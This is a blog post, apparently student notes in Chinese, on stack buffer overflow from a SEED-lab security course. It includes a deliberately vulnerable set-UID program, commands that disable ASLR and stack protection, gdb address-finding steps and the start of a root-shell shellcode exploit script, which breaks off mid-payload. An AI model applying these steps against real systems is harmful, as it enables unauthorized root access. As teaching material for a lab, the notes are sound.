@@ -1,0 +1,672 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>《计算机安全导论：深度实践》第四章缓冲区溢出 | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="hnu《软件安全测试》学习笔记  一、程序的内存结构： 典型的c语言程序，内存主要由五个部分构成： 代码段（text segment）：程序的可执行代码，通常只读。 数据段（data segment）：存放已经初始化的静态、全局变量。 BSS段（BSS segment）：存放未初始化的静态、全局变量。使用0填充这个段，即未初始化的静态、全局变量默认初始化为0 堆（heap）：动态内存分配，由ma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="《计算机安全导论：深度实践》第四章缓冲区溢出">
+<meta property="og:url" content="http://example.com/2023/10/17/04_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="hnu《软件安全测试》学习笔记  一、程序的内存结构： 典型的c语言程序，内存主要由五个部分构成： 代码段（text segment）：程序的可执行代码，通常只读。 数据段（data segment）：存放已经初始化的静态、全局变量。 BSS段（BSS segment）：存放未初始化的静态、全局变量。使用0填充这个段，即未初始化的静态、全局变量默认初始化为0 堆（heap）：动态内存分配，由ma">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-10-17T09:10:55.000Z">
+<meta property="article:modified_time" content="2023-10-17T14:29:57.973Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="软件安全测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/10/17/04_%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '《计算机安全导论：深度实践》第四章缓冲区溢出',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-17 22:29:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">《计算机安全导论：深度实践》第四章缓冲区溢出</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-17T09:10:55.000Z" title="Created 2023-10-17 17:10:55">2023-10-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-17T14:29:57.973Z" title="Updated 2023-10-17 22:29:57">2023-10-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="《计算机安全导论：深度实践》第四章缓冲区溢出"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li>hnu《软件安全测试》学习笔记</li>
+</ul>
+<h1 id="一、程序的内存结构："><a href="#一、程序的内存结构：" class="headerlink" title="一、程序的内存结构："></a>一、程序的内存结构：</h1><ul>
+<li>典型的c语言程序，内存主要由五个部分构成：<ul>
+<li>代码段（text segment）：程序的可执行代码，通常只读。</li>
+<li>数据段（data segment）：存放已经初始化的静态、全局变量。</li>
+<li>BSS段（BSS segment）：存放未初始化的静态、全局变量。使用0填充这个段，即未初始化的静态、全局变量默认初始化为0</li>
+<li>堆（heap）：动态内存分配，由malloc和free等函数处理。</li>
+<li>栈（stack）：存放函数内定义的局部变量，以及函数调用相关的数据，如形参、返回地址等。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310122026094.png" alt="20210319215715539"></p>
+<h1 id="二、栈与函数调用："><a href="#二、栈与函数调用：" class="headerlink" title="二、栈与函数调用："></a>二、栈与函数调用：</h1><h2 id="1、栈的内存布局："><a href="#1、栈的内存布局：" class="headerlink" title="1、栈的内存布局："></a>1、栈的内存布局：</h2><ul>
+<li>假设有如下函数：</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    x=a+b;</span><br><span class="line">    y=a-b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310121500527.png" alt="image-20231012150023302"></p>
+<ul>
+<li>调用func(a,b)，操作系统为其在栈顶分配空间如上图：<ul>
+<li>参数区，保存函数调用的参数，按相反的顺序入栈</li>
+<li>返回地址，函数调用结束后，下一条指令的地址</li>
+<li>前帧指针，上一个函数的栈帧指针</li>
+<li>局部变量，当前函数使用的局部变量。<strong>具体变量的存放顺序取决于编译器</strong>。</li>
+</ul>
+</li>
+<li>两个寄存器：<ul>
+<li>ebp，指向当前栈的栈底，总是指向old_ebp（即前帧指针）的保存地址</li>
+<li>esp，指向整个栈的顶部（因为当前栈的栈顶与整个栈的栈顶相同）</li>
+</ul>
+</li>
+</ul>
+<h2 id="2、帧指针："><a href="#2、帧指针：" class="headerlink" title="2、帧指针："></a>2、帧指针：</h2><ul>
+<li>书中管ebp叫做帧指针。</li>
+<li>如上面的例子，具体地址存取如下（x为ebp-8而非图中的ebp-4，说明具体顺序取决于编译器）</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310161546128.png" alt="image-20231016154625014"></p>
+<ul>
+<li>形参a,b逆序入栈，使得地址分别为ebp+8，ebp+12，使得阅读汇编代码时反而觉得是正的了，即从偏移值的角度，并不是反的。</li>
+<li>函数调用链：<ul>
+<li>只有一个帧指针寄存器，跳转函数时需要记录下前帧指针</li>
+<li>将ebp的值入栈</li>
+<li>ebp指向esp</li>
+<li>esp根据函数局部变量的个数大小，下移一段距离</li>
+</ul>
+</li>
+</ul>
+<h1 id="三、栈的缓冲区溢出攻击："><a href="#三、栈的缓冲区溢出攻击：" class="headerlink" title="三、栈的缓冲区溢出攻击："></a>三、栈的缓冲区溢出攻击：</h1><ul>
+<li>当将源地址的数据，复制到目的地址时，程序需要为目标区域预先分配空间。当预分配空间不足时，将导致溢出错误。</li>
+<li>缓冲区指的是程序的一段连续的内存空间，用于保存特定的数据。在复制中，目标区域就是一个缓冲区，已经提前指定为存储一定长度的字符串，当复制的字符串长度超过了划定的长度时，便产生了缓冲区溢出。</li>
+<li>Java能自动检测缓冲区溢出的问题，C&#x2F;C++没有这种机制。</li>
+</ul>
+<h2 id="1、复制数据到缓冲区："><a href="#1、复制数据到缓冲区：" class="headerlink" title="1、复制数据到缓冲区："></a>1、复制数据到缓冲区：</h2><ul>
+<li>C中的char* strcpy(char* dest,char* src)，将src地址的字符串复制到dest地址，复制结束的终止是遇到字符’\0’。</li>
+<li>应该确保src中的字符串以’\0’结尾，否则strcpy会越界访问其他数据，直到遇到\0</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char* src=&quot;test&quot;;//末尾自动添加\0</span><br><span class="line">char src[]=&#123;&#x27;t&#x27;,&#x27;e&#x27;,&#x27;s&#x27;,&#x27;t&#x27;&#125;;//默认没有\0，可能导致程序出错</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、缓冲区溢出："><a href="#2、缓冲区溢出：" class="headerlink" title="2、缓冲区溢出："></a>2、缓冲区溢出：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">12</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* str=<span class="string">&quot;aaaaaaaaaalonger than12&quot;</span>;</span><br><span class="line">    foo(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>调用foo函数时，只存在12字节的buffer缓冲区，且按照栈地址高到底，是从buffer[11]到buffer[0]的。</li>
+<li>复制时，是从buffer[0]到buffer[11]，所以溢出时，是<strong>溢出到栈的高地址区域</strong>，因此，溢出的buffer[12]、buffer[13]等，会覆盖old_ebp，返回地址，最终溢出到main函数帧的区域！</li>
+<li>溢出的后果：溢出修改了foo函数的返回地址，这个返回地址决定了跳转到何处执行<ul>
+<li>新地址（虚匿地址）没有映射到任何物理地址，跳转失败，程序崩溃。</li>
+<li>新地址（虚匿地址）映射到的物理地址是受保护的空间（如操作系统内核），仍然跳转失败，程序崩溃。</li>
+<li>新地址（虚匿地址）映射到的物理地址空间不被保护，但是不是有效的机器指令，仍然跳转失败，程序崩溃。</li>
+<li>新地址（虚匿地址）映射到的物理地址空间不被保护，是有效的机器指令，程序会继续执行，但是逻辑已经被修改了。</li>
+</ul>
+</li>
+</ul>
+<h2 id="3、利用缓冲区溢出："><a href="#3、利用缓冲区溢出：" class="headerlink" title="3、利用缓冲区溢出："></a>3、利用缓冲区溢出：</h2><ul>
+<li>想要实际利用缓冲区溢出漏洞，用户必须能够控制程序的输入，故有如下漏洞程序stack.c</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">	<span class="type">char</span> str[<span class="number">400</span>]; </span><br><span class="line">    FILE *badfile;</span><br><span class="line">	badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	fread(str,<span class="keyword">sizeof</span>(<span class="type">char</span>),<span class="number">300</span>,badfile);</span><br><span class="line">    <span class="comment">//str保存区域，要读取的每个元素的大小，读取的元素个数，File对象指针指向一个输入流</span></span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Returned1 Properly\n&quot;</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>关键是确定badfile文件的内容，使得溢出后，运行指定的代码。</li>
+<li>将新的返回地址放到中间，恶意代码放到文件末尾</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310161738256.png" alt="image-20231016173801176"></p>
+<ul>
+<li><p><strong>正常情况下，返回地址应该是代码区（保存可执行代码）的某个地址，通过修改返回地址，实际上新地址是栈区（？）的恶意代码的地址，也就是说，执行的是栈中保存的机器指令，而非代码区的机器指令。</strong></p>
+</li>
+<li><p>以上便是缓冲区溢出攻击的理论，实际攻击还要更复杂。</p>
+</li>
+</ul>
+<h1 id="四、环境准备："><a href="#四、环境准备：" class="headerlink" title="四、环境准备："></a>四、环境准备：</h1><ul>
+<li>虚拟机：Seed Ubuntu16.04</li>
+<li>大多数操作系统已经采取了保护措施，为了演示，还需要将这些防御机制关闭。</li>
+</ul>
+<h2 id="1、关闭地址随机化："><a href="#1、关闭地址随机化：" class="headerlink" title="1、关闭地址随机化："></a>1、关闭地址随机化：</h2><ul>
+<li>地址空间随机化（address space layout randomization，ASLR）是针对缓冲区溢出攻 击的防御措施之一。<ul>
+<li>ASLR对程序内存中的一些关键数据区域进行随机化，包括栈的位置、堆和库的位置等，目的是让攻击者难以猜测到所注入的恶意代码在内存中的具体位置（Wikipedia，2017b）。</li>
+</ul>
+</li>
+<li>4.8节将讨论ASLR机制，并演示如何攻破它。在本实验中，暂时使用下面的命令关闭操作系统这一机制：</li>
+<li>sudo sysctl -w kernel.randomize_va_space&#x3D;0</li>
+</ul>
+<h2 id="2、生成没有防御机制的漏洞程序："><a href="#2、生成没有防御机制的漏洞程序：" class="headerlink" title="2、生成没有防御机制的漏洞程序："></a>2、生成没有防御机制的漏洞程序：</h2><ul>
+<li>使用前面的stack.c</li>
+<li>因为编译默认会采取一些防御溢出漏洞的措施，需要使用特殊的编译指令。<ul>
+<li>-z execstack：默认情况下，一个程序的栈是不可执行的（注入的恶意代码也无法执行），该保护机制称作不可执行栈（non-executable stack）。改参数可以设置为可执行栈。</li>
+<li>-fno-stack-protector：默认情况下，gcc采取了StackGuard的保护机制，能够抵御基于栈的缓冲区溢出攻击，主要思想是在代码中添加一些特殊数据和检测机制，从而可以检测到缓冲区溢出的发生。该参数可以关闭该机制。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o stack -z execstack -fno-stack-protector stack.c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>设置为root的Set-UID程序：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root stack</span><br><span class="line">sudo chmod 4755 stack</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>测试，在badfile中放入超过100个字符的内容，运行stack，发现由于缓冲区溢出，程序崩溃了</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172001753.png" alt="image-20231017200138696"></p>
+<ul>
+<li>构造重复字符串：<ul>
+<li>seq指令会有序号</li>
+<li>printd ‘a%.0s’ {1..100}，可以</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172003486.png" alt="image-20231017200320452"></p>
+<h1 id="五、实施缓冲区溢出攻击："><a href="#五、实施缓冲区溢出攻击：" class="headerlink" title="五、实施缓冲区溢出攻击："></a>五、实施缓冲区溢出攻击：</h1><ul>
+<li>目标：利用前面生成的有漏洞的程序stack，获取root权限</li>
+</ul>
+<h2 id="1、寻找注入的恶意代码的地址："><a href="#1、寻找注入的恶意代码的地址：" class="headerlink" title="1、寻找注入的恶意代码的地址："></a>1、寻找注入的恶意代码的地址：</h2><ul>
+<li><p>恶意代码是放在缓冲区的，如果知道了缓冲区的起始地址buffer，就可以推算出恶意代码的地址。</p>
+</li>
+<li><p>想知道缓冲区的起始地址，只能靠猜，对于32位系统，大概需要猜测2^32。</p>
+</li>
+<li><p>这里的地址，指的是虚匿地址，不同进程可能有相同的虚拟地址，但会根据进程不同，映射到不同的物理地址。</p>
+</li>
+<li><p>影响搜索地址范围的因素：</p>
+<ul>
+<li>1、大多数操作系统把程序的栈放在固定的地址上。</li>
+<li>2、大多数栈并不深，只有函数调用链非常长时，才会有较深的函数栈。<ul>
+<li>因为函数栈只保存局部变量、返回地址、old_ebp等信息。</li>
+<li>实际执行代码在代码区中保存</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>验证栈的起始地址是否固定varAddr.c：</p>
+<ul>
+<li>首先打印main函数栈中，变量x的在栈中的地址</li>
+<li>然后打印func函数栈中，a1变量的地址</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>* a1)</span> &#123;<span class="comment">//a1也是一个变量，保存的是实参x的栈地址，&amp;a1是a1变量的栈地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;:: a1&#x27;s address is 0x%x \n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) &amp;a1); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> x=<span class="number">3</span>; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;:: x&#x27;s address is 0x%x \n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) &amp;x); <span class="comment">//%x十六进制打印</span></span><br><span class="line">    func(&amp;x); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>关闭操作系统ASLR机制：sudo sysctl -w kernel.randomize_va_space&#x3D;0 </li>
+<li>正常编译，多次运行发现输出的都是同一个地址：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172008332.png" alt="image-20231017200836294"></p>
+<h2 id="2、提高猜测的准确率："><a href="#2、提高猜测的准确率：" class="headerlink" title="2、提高猜测的准确率："></a>2、提高猜测的准确率：</h2><ul>
+<li>需要猜测恶意代码的入口地址，但是只要猜错一个字节，都会导致程序出错。</li>
+<li>通过在恶意代码入口之前，添加多个NOP指令，可以提高猜测的成功率。NOP指令不做任何事情，执行下一条指令。</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310170136728.png" alt="image-20231017013644630"></p>
+<ul>
+<li>关于代码执行顺序：<ul>
+<li>正常情况下，是执行代码区的机器指令，代码区指令顺序是从小地址到大地址，所以指令寄存器PC只要不同增大，就可以按顺序执行指令。</li>
+<li>使用溢出漏洞覆盖返回地址后，PC指向栈中的地址，PC是增大的，也就是说执行恶意代码时，是从栈顶到栈底的顺序。从而通过NOP能够提高猜测准确率。</li>
+</ul>
+</li>
+</ul>
+<h2 id="3、通过调试程序找到地址："><a href="#3、通过调试程序找到地址：" class="headerlink" title="3、通过调试程序找到地址："></a>3、通过调试程序找到地址：</h2><ul>
+<li>在实验中，攻击者与漏洞程序在同一台计算机，因此可以获得<strong>程序副本</strong>进行研究，不用猜测就能得到注入代码的地址。</li>
+<li>在实际中，一般是向一台远程计算机注入代码，无法获得程序副本，<strong>只能猜测</strong>。</li>
+<li>生成带有调试信息的可执行文件stack_gdb：使用选项-g</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o stack_gdb -z execstack -fno-stack-protector stack.c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成badfile，为空即可：touch badfile</li>
+<li>使用gdb程序调试运行stack_gdb：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172030969.png" alt="image-20231017203050932"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb stack_gdb</span><br><span class="line">b foo #在foo函数设置断点</span><br><span class="line">run   #程序运行，直到遇到断点</span><br><span class="line">p $ebp#打印此时函数栈ebp的值，默认十六进制</span><br><span class="line">p &amp;buffer#打印缓冲区地址buffer</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310171313066.png" alt="image-20231017131311893"></p>
+<ul>
+<li><p>ebp&#x3D;0xbfffeaf8，buffer&#x3D;0xbfffea8c，ebp-buffer&#x3D;108</p>
+</li>
+<li><p>返回地址字段的地址是ebp+4，从ebp+8开始就要设置为NOP指令或者恶意代码，所以可以设置返回地址字段的值为ebp+8。</p>
+</li>
+<li><p>确认返回地址字段在badfile中的位置：</p>
+<ul>
+<li>ebp+4&#x3D;buffer+108+4&#x3D;buffer+112</li>
+</ul>
+</li>
+<li><p>Ubuntu20.04的调试：自行测试发现，按照教材指令调试不能得到准确的值</p>
+<ul>
+<li>首先b foo设置断点后，还要next一下，才算是进入了foo函数栈，ebp的值才会变为foo的栈底。如下图，直接run时，RBP只有一层。</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172043840.png" alt="image-20231017204333808"></p>
+<ul>
+<li>next一下，则变为两层</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172044184.png" alt="image-20231017204445154"></p>
+<ul>
+<li>其次是直接p $ebp，发现输出的只有一部分，直接与buffer减的话，得到的值非常离谱。（<strong>补：后面突然想起来，是自己的原因，64位机器，应该是p $rbp才是完整的值！</strong>）</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172047711.png" alt="image-20231017204730678"></p>
+<ul>
+<li>正确做法是p$rbp：0x7fffffffddc0-0x7fffffffdd50</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310172048061.png" alt="image-20231017204845026"></p>
+<ul>
+<li>多次测试，发现都是rbp&#x3D;ddc0，buffer&#x3D;rbp-112</li>
+</ul>
+</li>
+</ul>
+<h2 id="4、构造输入文件："><a href="#4、构造输入文件：" class="headerlink" title="4、构造输入文件："></a>4、构造输入文件：</h2><ul>
+<li>文件结构：</li>
+</ul>
+<p><img src="https://rkang-blog-pictures.oss-cn-fuzhou.aliyuncs.com/blog_pictures/202310171321894.png" alt="image-20231017132108816"></p>
+<ul>
+<li>文本编辑器无法设置二进制数据，使用以下python脚本exploit.py生成badfile：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line">shellcode=( </span><br><span class="line">    <span class="string">&quot;\x31\xc0&quot;</span> 		<span class="comment"># xorl %eax,%eax </span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span>			<span class="comment"># push1 %eax </span></span><br><span class="line">    <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span> 	<span 